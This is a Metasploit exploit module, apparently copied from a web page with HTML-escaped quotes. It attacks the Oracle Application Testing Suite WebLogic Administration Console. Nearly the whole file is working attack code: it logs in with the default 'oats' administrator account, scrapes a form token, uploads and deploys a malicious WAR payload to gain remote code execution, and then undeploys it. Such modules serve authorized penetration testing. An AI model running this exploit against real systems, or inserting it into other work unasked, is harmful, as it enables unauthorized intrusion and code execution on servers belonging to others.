# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle Application Testing Suite WebLogic Server Administration Console War Deployment&#039;,
      &#039;Description&#039;    => %q{
        This module abuses a feature in WebLogic Server&#039;s Administration Console to install
        a malicious Java application in order to gain remote code execution. Authentication
        is required, however by default, Oracle ships with a "oats" account that you could
        log in with, which grants you administrator access.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Steven Seeley&#039;, # Used the trick and told me about it
          &#039;sinn3r&#039;         # Metasploit module
        ],
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [ &#039;WebLogic Server Administration Console 12 or prior&#039;, { } ]
        ],
      &#039;References&#039;     =>
        [
          # The CVE description matches what this exploit is doing, but it was for version
          # 9.0 and 9.1. We are not super sure whether this is the right CVE or not.
          # [&#039;CVE&#039;, &#039;2007-2699&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 8088
        },
      &#039;Notes&#039;          =>
        {
          &#039;SideEffects&#039; => [ IOC_IN_LOGS ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Mar 13 2019&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The route for the Rails application&#039;, &#039;/&#039;]),
        OptString.new(&#039;OATSUSERNAME&#039;, [true, &#039;The username for the admin console&#039;, &#039;oats&#039;]),
        OptString.new(&#039;OATSPASSWORD&#039;, [true, &#039;The password for the admin console&#039;])
      ])

    register_advanced_options(
      [
        OptString.new(&#039;DefaultOatsPath&#039;, [true, &#039;The default path for OracleATS&#039;, &#039;C:\\OracleATS&#039;])
      ])
  end

  class LoginSpec
    attr_accessor :admin_console_session
  end

  def login_spec
    @login_spec ||= LoginSpec.new
  end

  class OatsWarPayload < MetasploitModule
    attr_reader :name
    attr_reader :war

    def initialize(payload)
      @name = [Faker::App.name, Rex::Text.rand_name].sample
      @war = payload.encoded_war(app_name: name).to_s
    end
  end

  def default_oats_path
    datastore[&#039;DefaultOatsPath&#039;]
  end

  def war_payload
    @war_payload ||= OatsWarPayload.new(payload)
  end

  def set_frsc
    value = get_deploy_frsc
    @frsc = value
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;console&#039;, &#039;login&#039;, &#039;LoginForm.jsp&#039;)
    })

    if res && res.body.include?(&#039;Oracle WebLogic Server Administration Console&#039;)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def set_admin_console_session(res)
    cookie = res.get_cookies
    admin_console_session = cookie.scan(/ADMINCONSOLESESSION=(.+);/).flatten.first
    vprint_status("Token for console session is: #{admin_console_session}")
    login_spec.admin_console_session = admin_console_session
  end

  def is_logged_in?(res)
    html = res.get_html_document
    a_element = html.at(&#039;a&#039;)
    if a_element.respond_to?(:attributes) && a_element.attributes[&#039;href&#039;]
      link = a_element.attributes[&#039;href&#039;].value
      return URI(link).request_uri == &#039;/console&#039;
    end

    false
  end

  def do_login
    uri = normalize_uri(target_uri.path, &#039;console&#039;, &#039;login&#039;, &#039;LoginForm.jsp&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })

    fail_with(Failure::Unknown, &#039;No response from server&#039;) unless res
    set_admin_console_session(res)

    uri = normalize_uri(target_uri.path, &#039;console&#039;, &#039;j_security_check&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;cookie&#039; => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_post&#039; =>
        {
          &#039;j_username&#039;           => datastore[&#039;OATSUSERNAME&#039;],
          &#039;j_password&#039;           => datastore[&#039;OATSPASSWORD&#039;],
          &#039;j_character_encoding&#039; => &#039;UTF-8&#039;
        }
    })

    fail_with(Failure::Unknown, &#039;No response while trying to log in&#039;) unless res
    fail_with(Failure::NoAccess, &#039;Failed to login&#039;) unless is_logged_in?(res)
    store_valid_credential(user: datastore[&#039;OATSUSERNAME&#039;], private: datastore[&#039;OATSPASSWORD&#039;])
    set_admin_console_session(res)
  end

  def get_deploy_frsc
    # First we are just going through the pages in a specific order to get the FRSC value
    res = nil
    requests =
      [
        { path: &#039;console/&#039;, vars: {} },
        { path: &#039;console/console.portal&#039;, vars: {&#039;_nfpb&#039;=>"true"} },
        { path: &#039;console/console.portal&#039;, vars: {&#039;_nfpb&#039;=>"true", &#039;_pageLabel&#039; => &#039;HomePage1&#039;} }
      ]

    requests.each do |req|
      res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(target_uri.path, req[:path]),
        &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
        &#039;vars_get&#039; => req[:vars]
      })

      fail_with(Failure::Unknown, &#039;No response while retrieving FRSC&#039;) unless res
    end

    html = res.get_html_document
    hidden_input = html.at(&#039;input[@name="ChangeManagerPortletfrsc"]&#039;)
    frsc_attr = hidden_input.respond_to?(:attributes) ? hidden_input.attributes[&#039;value&#039;] : nil
    frsc_attr ? frsc_attr.value : &#039;&#039;
  end

  def do_select_upload_action
    action = &#039;/com/bea/console/actions/app/install/selectUploadApp&#039;
    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, &#039;oats\\servers\\AdminServer\\upload&#039;)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;    => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039;  =>
        {
          &#039;AppApplicationInstallPortlet_actionOverride&#039; => action
        },
      &#039;vars_post&#039; =>
        {
          &#039;AppApplicationInstallPortletselectedAppPath&#039; => app_path,
          &#039;AppApplicationInstallPortletfrsc&#039; => frsc
        }
    })

    fail_with(Failure::Unknown, "No response from #{action}") unless res
  end

  def do_upload_app_action
    action = &#039;/com/bea/console/actions/app/install/uploadApp&#039;
    ctype = &#039;application/octet-stream&#039;
    app_cname = &#039;AppApplicationInstallPortletuploadAppPath&#039;
    plan_cname = &#039;AppApplicationInstallPortletuploadPlanPath&#039;
    frsc_cname = &#039;AppApplicationInstallPortletfrsc&#039;
    war = war_payload.war
    war_name = war_payload.name
    post_data = Rex::MIME::Message.new
    post_data.add_part(war, ctype, &#039;binary&#039;, "form-data; name=\"#{app_cname}\"; filename=\"#{war_name}.war\"")
    post_data.add_part(&#039;&#039;, ctype, nil, "form-data; name=\"#{plan_cname}\"; filename=\"\"")
    post_data.add_part(frsc, nil, nil, "form-data; name=\"#{frsc_cname}\"")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039; =>
        {
          &#039;AppApplicationInstallPortlet_actionOverride&#039; => action
        },
       &#039;ctype&#039;   => "multipart/form-data; boundary=#{post_data.bound}",
       &#039;data&#039;    => post_data.to_s
    })

    fail_with(Failure::Unknown, "No response from #{action}") unless res
    print_response_message(res)
  end

  def do_app_select_action
    action = &#039;/com/bea/console/actions/app/install/appSelected&#039;
    war_name = war_payload.name
    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, "oats\\servers\\AdminServer\\upload\\#{war_name}.war")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039; =>
        {
          &#039;AppApplicationInstallPortlet_actionOverride&#039; => action
        },
      &#039;vars_post&#039; =>
        {
          &#039;AppApplicationInstallPortletselectedAppPath&#039; => app_path,
          &#039;AppApplicationInstallPortletfrsc&#039;            => frsc
        }
    })

    fail_with(Failure::Unknown, "No response from #{action}") unless res
    print_response_message(res)
  end

  def do_style_select_action
    action = &#039;/com/bea/console/actions/app/install/targetStyleSelected&#039;

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039; =>
        {
          &#039;AppApplicationInstallPortlet_actionOverride&#039; => action
        },
      &#039;vars_post&#039; =>
        {
          &#039;AppApplicationInstallPortlettargetStyle&#039; => &#039;Application&#039;,
          &#039;AppApplicationInstallPortletfrsc&#039;        => frsc
        }
    })

    fail_with(Failure::Unknown, "No response from #{action}") unless res
  end

  def do_finish_action
    action = &#039;/com/bea/console/actions/app/install/finish&#039;

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039; =>
        {
          &#039;AppApplicationInstallPortlet_actionOverride&#039; => action
        },
      &#039;vars_post&#039; =>
        {
          &#039;AppApplicationInstallPortletname&#039;             => war_payload.name,
          &#039;AppApplicationInstallPortletsecurityModel&#039;    => &#039;DDOnly&#039;,
          &#039;AppApplicationInstallPortletstagingStyle&#039;     => &#039;Default&#039;,
          &#039;AppApplicationInstallPortletplanStagingStyle&#039; => &#039;Default&#039;,
          &#039;AppApplicationInstallPortletfrsc&#039;             => frsc
        }
    })

    fail_with(Failure::Unknown, "No response from #{action}") unless res
    print_response_message(res)

    # 302 is a good enough indicator of a successful upload, otherwise
    # the server would actually return a 200 with an error message.
    res.code == 302
  end

  def print_response_message(res)
    html = res.get_html_document
    message_div = html.at(&#039;div[@class="message"]&#039;)
    if message_div
      msg = message_div.at(&#039;span&#039;).text
      print_status("Server replies: #{msg.inspect}")
    end
  end

  def deploy_war
    set_frsc
    print_status("FRSC value: #{frsc}")
    do_select_upload_action
    do_upload_app_action
    do_app_select_action
    do_style_select_action
    do_finish_action
  end

  def goto_war(name)
    print_good("Operation \"#{name}\" is a go!")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, name)
    })

    print_status("Code #{res.code} on \"#{name}\" request") if res
  end

  def undeploy_war
    war_name = war_payload.name
    handle = &#039;com.bea.console.handles.JMXHandle("com.bea:Name=oats,Type=Domain")&#039;
    contents = %Q|com.bea.console.handles.AppDeploymentHandle("com.bea:Name=#{war_name},Type=AppDeployment")|
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;console&#039;, &#039;console.portal&#039;),
      &#039;cookie&#039;   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
      &#039;vars_get&#039; =>
        {
          &#039;AppApplicationUninstallPortletreturnTo&#039; => &#039;AppDeploymentsControlPage&#039;,
          &#039;AppDeploymentsControlPortlethandle&#039; => handle
        },
      &#039;vars_post&#039; =>
        {
          # For some reason, the value given to the server is escapped twice.
          # The Metasploit API should do it at least once.
          &#039;AppApplicationUninstallPortletchosenContents&#039; => CGI.escape(contents),
          &#039;_pageLabel&#039; => &#039;AppApplicationUninstallPage&#039;,
          &#039;_nfpb&#039;      => &#039;true&#039;,
          &#039;AppApplicationUninstallPortletfrsc&#039; => frsc
        }
    })

    if res && res.code == 302
      print_good("Successfully undeployed #{war_name}.war")
    else
      print_warning("Unable to successfully undeploy #{war_name}.war")
      print_warning(&#039;You may want to do so manually.&#039;)
    end
  end

  def cleanup
    undeploy_war if is_cleanup_ready
    super
  end

  def setup
    @is_cleanup_ready = false
    super
  end

  def exploit
    unless check == Exploit::CheckCode::Detected
      print_status(&#039;Target does not have the login page we are looking for.&#039;)
      return
    end

    do_login
    print_good("Logged in as #{datastore[&#039;OATSUSERNAME&#039;]}:#{datastore[&#039;OATSPASSWORD&#039;]}")
    print_status("Ready for war. Codename \"#{war_payload.name}\" at #{war_payload.war.length} bytes")
    result = deploy_war
    if result
      @is_cleanup_ready = true
      goto_war(war_payload.name)
    end
  end

  attr_reader :frsc
  attr_reader :is_cleanup_ready
end

